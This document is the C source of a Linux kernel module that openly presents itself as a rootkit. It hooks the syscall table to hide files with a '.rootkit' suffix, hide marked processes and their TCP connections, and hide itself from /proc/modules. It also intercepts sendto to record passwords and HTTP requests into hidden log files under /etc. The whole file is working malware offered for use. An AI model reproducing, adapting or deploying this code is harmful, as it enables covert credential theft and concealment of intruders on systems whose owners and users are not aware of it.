#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <asm/uaccess.h>    // Needed by segment descriptors
#include <linux/slab.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs_struct.h>    //for xchg(&current->fs->umask, ... )
#include <asm/cacheflush.h>
#include <linux/version.h>      //for checking kernel version

//beginning of the rootkit's configuration
#define FILE_SUFFIX ".rootkit"    	//hiding files with names ending on defined suffix
#define COMMAND_CONTAINS ".//./"    //hiding processes which cmdline contains defined text
#define ROOTKIT_NAME "rootkit"    	//you need to type here name of this module to make this module hidden
#define SYSCALL_MODIFY_METHOD PAGE_RW   //method of making syscall table writeable, CR0 or PAGE_RW
#define UNABLE_TO_UNLOAD 0
#define DEBUG 0                     //this is for me :)
//end of configuration


#define BEGIN_BUF_SIZE 10000
#define LOG_SEPARATOR "\n.............................................................\n"
#define CMDLINE_SIZE 1000
#define MAX_DIRENT_READ 10000


#define CR0 0
#define PAGE_RW 1

#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))

DEFINE_MUTEX(log_mutex_pass);
DEFINE_MUTEX(log_mutex_http);

#define EMBEDDED_NAME_MAX  (PATH_MAX - offsetof(struct filename, iname))

struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};


unsigned long **sys_call_table_;
unsigned long original_cr0;

asmlinkage long (*ref_sys_getdents) (unsigned int,
    struct linux_dirent __user *, unsigned int);
asmlinkage long (*ref_sys_getdents64) (unsigned int,
    struct linux_dirent64 __user *, unsigned int);
asmlinkage long (*ref_sys_sendto) (int, void __user *, size_t, unsigned,
    struct sockaddr __user *, int);
asmlinkage long (*ref_sys_open) (const char __user * filename,
    int flags, umode_t mode);
asmlinkage long (*ref_sys_readlink) (const char __user * path,
    char __user * buf, int bufsiz);

/*functions for r/w files copied from stackoverflow*/

struct file *file_open(const char *path, int flags, int rights)
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());

    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp))
    {
    	err = PTR_ERR(filp);
    	return NULL;
    }
    return filp;
}

void file_close(struct file *file)
{
    if(file)
        filp_close(file, NULL);
}

int file_read(struct file *file, unsigned long long offset,
    unsigned char *data, unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_write(struct file *file, unsigned long long offset,
    const unsigned char *data, unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file *file)
{
    vfs_fsync(file, 0);
    return 0;
}

/*end of functions for r/w files copied from stackoverflow*/


//set a page writeable
int make_rw(unsigned long address)
{
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte |= _PAGE_RW;
    return 0;
}
 
//set a page read only
int make_ro(unsigned long address)
{ 
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

char *read_whole_file(struct file *f, int *return_read)
{
    int buf_size = BEGIN_BUF_SIZE;
    int res;
    int read = 0;
    char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
    char *buf_old = NULL;
    if (buf == NULL)
    	return NULL;

    res = file_read(f, read, buf + read, buf_size - read);
    while (res > 0) 
    {
    	read += res;
    	if (read == buf_size)
        {
    		buf_size = buf_size * 2;
    		buf_old = buf;
    		buf = krealloc(buf,buf_size+1,GFP_KERNEL);
    		if(buf == NULL)
    		{
    		  kfree(buf_old); //https://tapaswenipathak.wordpress.com/2015/01/13/faults-in-linux-kernel-3-x-wrong-use-of-krealloc/
    		  return NULL;
    		}
    	}
    	res = file_read(f, read, buf + read, buf_size - read);
    }
    if (return_read)
    	*return_read = read;
    buf[read] = 0;
    return buf;
}

char *read_n_bytes_of_file(struct file *f, int n, int *return_read)
{
    int buf_size = n;
    int res;
    int read = 0;
    char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
    if (buf == NULL)
    	return NULL;

    res = file_read(f, read, buf + read, buf_size - read);
    while (res > 0) {
    	read += res;
    	res = file_read(f, read, buf + read, buf_size - read);
    }
    if (return_read)
    	*return_read = read;
    buf[read] = 0;
    return buf;
}

//check if file ends on suffix
int check_file_suffix(const char *name)
{
    int len = strlen(name);
    int suffix_len = strlen(FILE_SUFFIX);
    if (len >= suffix_len) 
    {
    	const char *check_suffix = name;
    	check_suffix += len - suffix_len;
    	if (strcmp(check_suffix, FILE_SUFFIX) == 0)
    		return 1;
    }
    return 0;
}

int is_int(const char *data)
{
    if(data == NULL)
        return 0;
    while(*data)
    {
        if(*data<'0' || *data>'9')
            return 0;
        data++;
    }
    return 1;
}

int check_process_prefix(const char *name)
{
    int err;
    long pid;
    char *path = NULL;
    struct file *f = NULL;
    char *buf = NULL;
    int res = 0;
    int read;
    int i;

    if(!is_int(name))
    	goto end;

    err = kstrtol(name, 10, &pid);
    if (err != 0)
    	goto end;

    path = kzalloc(strlen("/proc/") + strlen(name) 
        + strlen("/cmdline") + 1, GFP_KERNEL);
        
    if (path == NULL)
    	goto end;

    strcpy(path, "/proc/");
    strcat(path, name);
    strcat(path, "/cmdline");

    f = file_open(path, O_RDONLY, 0);
    if (f == NULL)
    	goto end;

    buf = read_n_bytes_of_file(f, CMDLINE_SIZE, &read);

    if(buf == NULL)
    	goto end;

    for (i = 0; i < read; i++)
    {
    	if (buf[i] == 0)
    		buf[i] = ' ';	//cmdline is in format argv[0]\x00argv[1] .... 
    }

    if (strstr(buf, COMMAND_CONTAINS))
    {
    	if(DEBUG) printk(KERN_INFO "hiding %s\n", buf);
    	res = 1;
    }

end:
    if (f)
    	file_close(f);
    kfree(buf);
    kfree(path);
    return res;
}

int check_file_name(const char *name)
{
    return strcmp(name, ROOTKIT_NAME) == 0;
}

int should_be_hidden(const char *name)
{
    return check_file_suffix(name) | check_process_prefix(name) |
        check_file_name(name);
}

asmlinkage long new_sys_getdents(unsigned int fd,
    struct linux_dirent __user * dirent, unsigned int count)
{
    long size;
    long new_size;
    long ret;
    long bpos;
    struct linux_dirent *d;
    struct linux_dirent *fake_dirent = NULL;
    
    
    size = ref_sys_getdents(fd, dirent, count);
    if (size <= 0)
    {
    	ret = size;
        goto end;
    }
    
       
    fake_dirent = kmalloc(size, GFP_KERNEL);
    if (fake_dirent == NULL)
    {
        ret = size;
        goto end;
    }
    
    if(copy_from_user(fake_dirent, dirent, size))
    {
        ret = size;
        goto end;
    }
       
    new_size = size; 
    for (bpos = 0; bpos < new_size;)
    {
    	d = (struct linux_dirent *)((char *)fake_dirent + bpos);
    	if (d->d_ino != 0)
        {
    		if (should_be_hidden((char *)d->d_name))
            {
    			//delete this entry
    			int rest = new_size - (bpos + d->d_reclen);
    			int from_ = bpos + d->d_reclen;
    			int to_ = bpos;

    			struct linux_dirent *from =
    			    (struct linux_dirent *)((char *)
    			    fake_dirent + from_);
    			struct linux_dirent *to =
    			    (struct linux_dirent *)((char *)
    			    fake_dirent + to_);

    			memcpy(to, from, rest);
    			new_size -= d->d_reclen;
    			continue;
    		}
    	}
    	bpos += d->d_reclen;
    }

    if(copy_to_user(dirent, fake_dirent, new_size))
    {
        ret = -1;
        goto end;
    }
    
    ret = new_size;
    
end:
    if(fake_dirent)
        kfree(fake_dirent);
        
    return ret;
}

asmlinkage long new_sys_getdents64(unsigned int fd,
    struct linux_dirent64 __user * dirent, unsigned int count)
{
    long size;
    long new_size;
    long ret;
    long bpos;
    struct linux_dirent64 *d;
    struct linux_dirent64 *fake_dirent = NULL;
    
    size = ref_sys_getdents64(fd, dirent, count);
    if (size <= 0)
    {
        ret = size;
    	goto end;
    }
    
    fake_dirent = kmalloc(size, GFP_KERNEL);
    if(fake_dirent == NULL)
    {
        ret = size;
        goto end;
    }
    
    if(copy_from_user(fake_dirent, dirent, size))
    {
        ret = size;
        goto end;
    }
    
    new_size = size;
    for (bpos = 0; bpos < new_size;)
    {
    	d = (struct linux_dirent64 *)((char *)fake_dirent + bpos);
    	if (d->d_ino != 0) 
        {
    		if (should_be_hidden((char *)d->d_name)) 
            {
    			//delete this entry
    			int rest = new_size - (bpos + d->d_reclen);
    			int from_ = bpos + d->d_reclen;
    			int to_ = bpos;

    			struct linux_dirent64 *from =
    			    (struct linux_dirent64 *)((char *)
    			    fake_dirent + from_);
    			struct linux_dirent64 *to =
    			    (struct linux_dirent64 *)((char *)
    			    fake_dirent + to_);

    			memcpy(to, from, rest);
    			new_size -= d->d_reclen;
    			continue;
    		}
    	}
    	bpos += d->d_reclen;
    }

    if(copy_to_user(dirent, fake_dirent, new_size))
    {
        ret = -1;
        goto end;
    }
    
    ret = new_size;
    
    
end:
    if(fake_dirent)
        kfree(fake_dirent);
    
    return ret;
}

void save_to_log(const char *log_type, const char *what, size_t size)
{
    int err;
    struct file *f = NULL;
    long long file_size;
    struct path p;
    struct kstat ks;
    char *full_path = kzalloc(strlen("/etc/") + strlen(log_type)
        + strlen(FILE_SUFFIX) + 1, GFP_KERNEL);
    current->flags |= PF_SUPERPRIV;

    if (full_path == NULL)
    	goto end;

    strcpy(full_path, "/etc/");
    strcat(full_path, log_type);
    strcat(full_path, FILE_SUFFIX);

    if(DEBUG) printk(KERN_INFO "saving to log\n");

    f = file_open(full_path, O_WRONLY | O_CREAT, 0777);
    if (f == NULL)
    	goto end;

    kern_path(full_path, 0, &p);
    
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
    err = vfs_getattr(&p, &ks, 0xFFFFFFFF, 0);
#else
    err = vfs_getattr(&p, &ks);
#endif

    if (err)
    	goto end;

    if(DEBUG) printk(KERN_INFO "size: %lld\n", ks.size);
    file_size = ks.size;
    err = file_write(f, file_size, what, size);
    if (err == -EINVAL)
    	goto end;

    file_size += size;
    err = file_write(f, file_size, LOG_SEPARATOR, strlen(LOG_SEPARATOR));
    if (err == -EINVAL)
    	goto end;

    if(DEBUG) printk(KERN_INFO "ok\n");

end:
    if (f)
        file_close(f);
    kfree(full_path);
    current->flags |= PF_SUPERPRIV;
}

int password_found(const char *buf, size_t size)
{
    if (strnstr(buf, "password=", size))
    	return 1;
    if (strnstr(buf, "pass=", size))
    	return 1;
    if (strnstr(buf, "haslo=", size)) //password in polish
    	return 1;
    return 0;
}

int http_header_found(const char *buf, size_t size)
{
    if (strnstr(buf, "POST /", size))
    	return 1;
    if (strnstr(buf, "GET /", size))
    	return 1;
    return 0;
}

asmlinkage long new_sys_sendto(int fd, void __user * buff_user, size_t len,
    unsigned int flags, struct sockaddr __user * addr, int addr_len)
{
    
    char *buff = kmalloc(len, GFP_KERNEL);
    if (buff == NULL)
        goto end;
        
    if(copy_from_user(buff, buff_user, len))
        goto end;
    
    
    if (password_found(buff, len))
    {
    	if(DEBUG) printk(KERN_INFO "password found\n");
    	mutex_lock(&log_mutex_pass);
    	save_to_log("passwords", buff, len);
    	mutex_unlock(&log_mutex_pass);
    }

    if (http_header_found(buff, len))
    {
    	if(DEBUG) printk(KERN_INFO "http found\n");
    	mutex_lock(&log_mutex_http);
    	save_to_log("http_requests", buff, len);
    	mutex_unlock(&log_mutex_http);
    }
    
end:
    if(buff)
        kfree(buff);

    return ref_sys_sendto(fd, buff_user, len, flags, addr, addr_len);
}

struct inode_list
{
    long inode;
    struct inode_list *next;
};

struct inode_list *first_inode;

int is_inode_hidden(long inode)
{
    struct inode_list *i_ptr = first_inode;
    while(i_ptr)
    {
        if(i_ptr->inode == inode)
            return 1;
        i_ptr = i_ptr->next;
    }
    return 0;
}

void make_inode_hidden(long inode)
{
    struct inode_list *new_inode = NULL;

    if(is_inode_hidden(inode))
        return;

    new_inode=kmalloc(sizeof(struct inode_list), GFP_KERNEL);
    if(new_inode == NULL)
        return;

    new_inode->next = first_inode;
    new_inode->inode = inode;
    first_inode = new_inode;
}

void clean_hidden_inodes(void)
{
    struct inode_list *i_ptr = first_inode;
    struct inode_list *tmp;

    while(i_ptr)
    {
        tmp = i_ptr;
        i_ptr = i_ptr->next;
        kfree(tmp);
    }
}

//copied from netstat.c (and slightly modified)

#define PRG_SOCKET_PFX  "socket:["
#define PRG_SOCKET_PFXl (strlen(PRG_SOCKET_PFX))

static void extract_type_1_socket_inode(const char lname[], long * inode_p)
{

    /* If lname is of the form "socket:[12345]", extract the "12345"
       as *inode_p.  Otherwise, return -1 as *inode_p.
       */

    if(DEBUG) printk(KERN_INFO "extracting %s\n", lname);
    if (strlen(lname) < PRG_SOCKET_PFXl+3) *inode_p = -1;
    else if (memcmp(lname, PRG_SOCKET_PFX, PRG_SOCKET_PFXl)) *inode_p = -1;
    else if (lname[strlen(lname)-1] != ']') *inode_p = -1;
    else
    {
        char inode_str[strlen(lname + 1)];  /* e.g. "12345" */
        const int inode_str_len = strlen(lname) - PRG_SOCKET_PFXl - 1;
        int err;

        strncpy(inode_str, lname + PRG_SOCKET_PFXl, inode_str_len);
        inode_str[inode_str_len] = '\0';
        err = kstrtol(inode_str, 10, inode_p);
        if (err || *inode_p < 0 || *inode_p >= INT_MAX)
            *inode_p = -1;
    }
}

int load_inodes_of_process(const char *name)
{
    char *path = NULL;
    int path_len;
    long fd;
    long read;
    long bpos;
    struct linux_dirent *dirent = NULL;
    struct linux_dirent *d;

    if(DEBUG) printk(KERN_INFO "collecting descriptors of %s\n", name);

    path_len = strlen("/proc/") + strlen(name) + strlen("/fd");
    path = kmalloc(path_len+1, GFP_KERNEL);
    if(!path)
        goto end;

    strcpy(path, "/proc/");
    strcat(path, name);
    strcat(path, "/fd");

    fd = ref_sys_open(path, O_RDONLY | O_DIRECTORY, 0);

    dirent = kmalloc(MAX_DIRENT_READ, GFP_KERNEL);
    if(!dirent)
        goto end;

    //listing directory /proc/[id]/fd
    //and then, calling readlink which returns inode of socket
    //dirent is a memory allocated in kernel space, it should be in user space but it works thanks to set_fs(KERNEL_DS);
    read = ref_sys_getdents(fd, dirent, MAX_DIRENT_READ);
    if (read <= 0)
    	goto end;

    for (bpos = 0; bpos < read;)//todo
    {
    	d = (struct linux_dirent *)((char *)dirent + bpos);
    	if (d->d_ino != 0)
        {
    		if(strcmp(d->d_name,"0") && strcmp(d->d_name,"1") && strcmp(d->d_name,"2") && strcmp(d->d_name,".") && strcmp(d->d_name,".."))
    		{
    		    char lname[30];
    		    char line[40];
    		    int lnamelen;
    		    long inode;

    		    snprintf(line, sizeof(line), "%s/%s", path,d->d_name);
    		    lnamelen = ref_sys_readlink(line, lname, sizeof(lname)-1);
    		    if(lnamelen == -1)
    		    {
                    bpos += d->d_reclen;
                    continue;
    		    }
    		    lname[MIN(lnamelen, sizeof(lname)-1)] = '\0';
    		    extract_type_1_socket_inode(lname, &inode);
    		    if(inode != -1)
                    make_inode_hidden(inode);
    		}
    	}
    	bpos += d->d_reclen;
    }

end:
    kfree(dirent);
    kfree(path);
    return 0;
}

void load_inodes_to_hide(void)
{
    //enum /proc
    struct linux_dirent *dirent = NULL;
    struct linux_dirent *d;
    mm_segment_t old_fs;
    long fd, read, bpos;

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    
    fd = ref_sys_open("/proc", O_RDONLY | O_DIRECTORY, 0);
    if(fd<0)
        return;

    dirent = kmalloc(MAX_DIRENT_READ, GFP_KERNEL);
    if(!dirent)
        goto end;

    read = ref_sys_getdents(fd, dirent, MAX_DIRENT_READ);
    if (read <= 0)
    	goto end;

    //for every process:
    //check if this process should be hidden
    //if so, get list of inodes of fd's, and save them for further processing
    for (bpos = 0; bpos < read;)
    {
    	d = (struct linux_dirent *)((char *)dirent + bpos);
    	if (d->d_ino != 0) 
        {
    		if (should_be_hidden((char *)d->d_name))
    			load_inodes_of_process((char *)d->d_name);
    	}
    	bpos += d->d_reclen;
    }

    set_fs(old_fs);

end:
    kfree(dirent);
}

char* next_column(char *ptr)
{
    while(*ptr != ' ')
        ptr++;
    while(*ptr == ' ')
        ptr++;
    return ptr;
}


//when open("/proc/modules") is called, reate fake file with removed rootkit entry and redirect to this file
//also remove entries from /proc/net/tcp etc. of hidden processes
asmlinkage long new_sys_open(char __user * filename_user, int flags, umode_t mode)
{
    long ret;
    int filename_len;
    char *filename = NULL;
    int rootkit_path_len = strlen("/sys/module/") + strlen(ROOTKIT_NAME);
    char *rootkit_path = kmalloc(rootkit_path_len+1, GFP_KERNEL);
    if(!rootkit_path)
        goto call_ref_sys_open;
        
    strcpy(rootkit_path, "/sys/module/");
    strcat(rootkit_path, ROOTKIT_NAME);
    
    filename_len = strnlen_user(filename_user, EMBEDDED_NAME_MAX);
    
    filename = kmalloc(filename_len+1, GFP_KERNEL);
    if (filename == NULL)
        goto call_ref_sys_open;
    
    if(copy_from_user(filename, filename_user, filename_len))
        goto call_ref_sys_open;
    filename[filename_len] = '\x00'; 
    
    if (strcmp(filename, "/proc/modules") == 0)
    {
    	struct file *fake_modules = NULL;
    	struct file *real_modules = NULL;
    	mm_segment_t old_fs;
    	char *modules_buf = NULL;
    	char *rootkit, *rootkit_end;
    	char *new_path = 0;
    	long res;
    	int err = 0;

    	if(DEBUG) printk(KERN_INFO "open /proc/modules\n");

    	new_path =
    	    kzalloc(strlen("/etc/modules") + strlen(FILE_SUFFIX) + 1,
    	    GFP_KERNEL);

    	if (!new_path)
        {
            err = 1;
    		goto end1;
    	}

    	strcpy(new_path, "/etc/modules");
    	strcat(new_path, FILE_SUFFIX);


    	real_modules = file_open("/proc/modules", O_RDONLY, 0);
    	if (real_modules == NULL)
        {
    		err = 1;
    		goto end1;
    	}
    	//open files
    	fake_modules =
    	    file_open(new_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
    	if (fake_modules == NULL)
        {
    		err = 1;
    		goto end1;
    	}

    	modules_buf = read_whole_file(real_modules, NULL);
    	if (modules_buf == NULL)
        {
    		err = 1;
    		goto end1;
    	}

    	//remove rootkit from modules list
    	rootkit = strstr(modules_buf, ROOTKIT_NAME);
    	if (rootkit)	//shouldn't be NULL anyway - only if rootkit name is bad configured in #define
    	{
    		rootkit_end = rootkit;
    		while (*rootkit_end != '\n' && *rootkit_end != '\x00')	//shouldn't be \x00 anyway - only if somebody do it intentionally and change sys_open before us
    			rootkit_end++;
    		memcpy(rootkit, rootkit_end + 1, strlen(rootkit_end) + 1);	//wiping rootkit entry
    	}
    	//save modules list to fake file
    	res =
    	    file_write(fake_modules, 0, modules_buf,
    	    strlen(modules_buf));

end1:
    	file_close(fake_modules);
    	file_close(real_modules);
    	kfree(modules_buf);

    	if(err)
    	    ret = ref_sys_open(filename, flags, mode);
    	else
        {
    	    //http://stackoverflow.com/questions/7629141/allocate-user-space-memory-from-kernel
    	    old_fs = get_fs();
    	    set_fs(KERNEL_DS);
    	    //redirect open("/proc/modules") to fake file
    	    ret = ref_sys_open(new_path, flags, mode);
    	    set_fs(old_fs);
    	}
    	kfree(new_path);
        
#if UNABLE_TO_UNLOAD
    }
    else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0)
    {
    	ret = -ENOENT;
#endif
    }
    else if (strcmp(filename, "/proc/net/tcp") == 0)
    {
    	struct file *fake_net = NULL;
    	struct file *real_net = NULL;
    	mm_segment_t old_fs;
    	char *net_buf = NULL;
    	char *new_path = NULL;
    	long res;
    	int err = 0;
    	char *line_ptr;

    	load_inodes_to_hide();

    	new_path =
    	    kzalloc(strlen("/etc/net") + strlen(FILE_SUFFIX) + 1,
    	    GFP_KERNEL);

    	if (!new_path)
        {
            err = 1;
    		goto end2;
    	}

    	strcpy(new_path, "/etc/net");
    	strcat(new_path, FILE_SUFFIX);


    	real_net = file_open("/proc/net/tcp", O_RDONLY, 0);
    	if (real_net == NULL)
        {
    		err = 1;
    		goto end2;
    	}
    	//open files
    	fake_net = file_open(new_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
    	if (fake_net == NULL)
        {
    		err = 1;
    		goto end2;
    	}

    	net_buf = read_whole_file(real_net, NULL);
    	if (net_buf == NULL)
        {
    		err = 1;
    		goto end2;
    	}

    	//parse every line, extract inode, check if inode belongs to hidden process, if so, remove this line from file
    	line_ptr = strchr(net_buf, '\n');
        while(line_ptr && *(line_ptr+1))
    	{
            int i;
            char *column;
            char *space;
            long inode;
            int err;

            if(*line_ptr == 0)
                break;

            column = line_ptr + 1;
            for(i=0; i<10; i++)
                column = next_column(column);

            space = strchr(column, ' ');
            if(!space) //file is not in a proper format
                break;
            *space = 0;
            err = kstrtol(column, 10, &inode);
            *space = ' ';
            if(err)
                break;

            if(is_inode_hidden(inode))
            {
                //if this connection belongs to hidden process, hide this connection by removing this line
                char *destination = line_ptr + 1;
                char *source = strchr(line_ptr+1, '\n') + 1;
                int size = strlen(net_buf) - (source-net_buf) + 1;
                if(size == 0)
                {
                    *destination = 0;
                    continue;
                }

                memcpy(destination, source, size);
                continue;
            }

            line_ptr = strchr(line_ptr+1, '\n');
        }

    	res = file_write(fake_net, 0, net_buf, strlen(net_buf));

end2:
    	file_close(fake_net);
    	file_close(real_net);
    	kfree(net_buf);

    	if(err)
            ret = ref_sys_open(filename, flags, mode);
    	else
        {
            //http://stackoverflow.com/questions/7629141/allocate-user-space-memory-from-kernel
            old_fs = get_fs();
            set_fs(KERNEL_DS);
            //redirect open to fake file
            ret = ref_sys_open(new_path, flags, mode);
            set_fs(old_fs);
        }

    	kfree(new_path);
    }
    else
    	goto call_ref_sys_open;
    

end:
    if(filename)
        kfree(filename);
    
    if(rootkit_path)
        kfree(rootkit_path);
    
    return ret;
call_ref_sys_open:
    ret = ref_sys_open(filename_user, flags, mode);
    goto end;
}


//explanation: https://bbs.archlinux.org/viewtopic.php?id=139406
static unsigned long **acquire_sys_call_table(void)
{
    unsigned long int offset = (unsigned long int) sys_close;
    unsigned long **sct;
    
    if(DEBUG) printk(KERN_INFO "finding syscall table from: %p\n", (void*)offset);

    while (offset < ULLONG_MAX)
    {
    	sct = (unsigned long **)offset;

    	if (sct[__NR_close] == (unsigned long *)sys_close)
        {
            if(DEBUG) printk(KERN_INFO "sys call table found: %p\n", (void*)sct);
    		return sct;
        }
    	offset += sizeof(void *);
    }

    return NULL;
}

static void create_file(char *name)
{
    struct file *f;
    char *path;

    mode_t old_mask = xchg(&current->fs->umask, 0);

    path = kzalloc(strlen(name) + strlen(FILE_SUFFIX) + 1, GFP_KERNEL);

    if (!path)
    	return;

    strcpy(path, name);
    strcat(path, FILE_SUFFIX);

    f = file_open(path, O_CREAT, 0777);
    if (f)
    	file_close(f);

    kfree(path);

    xchg(&current->fs->umask, old_mask);
}

/* Creates files with permissions 777 used later by rootkit
 * because functions filp* worsk with privileges of user calling syscall
 * files:
 * /etc/passwords[FILE_SUFFIX]
 * /etc/http_requests[FILE_SUFFIX]
 * /etc/modules[FILE_SUFFIX]
*/
static void create_files(void)
{
    create_file("/etc/modules");
    create_file("/etc/http_requests");
    create_file("/etc/passwords");
}

#define register(name) \
 ref_sys_##name = (void *)sys_call_table_[__NR_##name]; \
 sys_call_table_[__NR_##name] = (unsigned long *)new_sys_##name;

#define unregister(name) \
 sys_call_table_[__NR_##name] = (unsigned long *)ref_sys_##name;

static int __init rootkit_start(void)
{       
    if (!(sys_call_table_ = acquire_sys_call_table()))
    	return 0;
        
    create_files();
    
    ref_sys_readlink = (void *)sys_call_table_[__NR_readlink];

    
#if SYSCALL_MODIFY_METHOD == CR0
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x00010000);
#endif
#if SYSCALL_MODIFY_METHOD == PAGE_RW
    make_rw((long unsigned int)sys_call_table_);
#endif

    
    register (getdents);
    register (getdents64);
    register (sendto);
    register (open);


#if SYSCALL_MODIFY_METHOD == CR0
    write_cr0(original_cr0);
#endif
#if SYSCALL_MODIFY_METHOD == PAGE_RW
    make_ro((long unsigned int)sys_call_table_);
#endif

    return 0;
}

static void __exit rootkit_end(void)
{
    
    if (!sys_call_table_)
    	return;

#if SYSCALL_MODIFY_METHOD == CR0
    write_cr0(original_cr0 & ~0x00010000);
#endif
#if SYSCALL_MODIFY_METHOD == PAGE_RW
    make_rw((long unsigned int)sys_call_table_);
#endif

    unregister(getdents);
    unregister(getdents64);
    unregister(sendto);
    unregister(open);

#if SYSCALL_MODIFY_METHOD == CR0
    write_cr0(original_cr0);
#endif
#if SYSCALL_MODIFY_METHOD == PAGE_RW
    make_ro((long unsigned int)sys_call_table_);
#endif

    clean_hidden_inodes();
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
